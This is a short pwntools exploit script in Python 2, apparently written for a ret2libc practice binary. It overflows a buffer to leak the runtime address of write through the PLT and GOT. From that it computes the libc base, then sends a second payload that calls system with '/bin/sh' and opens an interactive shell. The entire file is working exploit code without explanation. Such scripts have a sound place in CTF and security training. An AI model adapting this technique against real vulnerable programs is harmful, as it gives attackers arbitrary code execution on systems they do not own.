from pwn import *
context.arch = "i386"
context.log_level = "debug"
p = process("./ret2libc")
e =ELF("./ret2libc")
w_plt = e.plt["write"]
buf2 = e.symbols["buf2"]

w_got = e.got["write"]
vul = e.symbols["vul"]

p1 = flat(["A"*22,w_plt,vul,1,w_got,4])
p.recvuntil("hello")

p.sendline(p1)
addr = u32(p.recv(4))
print "write addr "+hex(addr)

libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc.address = addr - libc.symbols["write"]
sys = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

p2 = flat(["A"*22,sys,1,bin_sh])
p.sendline(p2)
p.interactive()

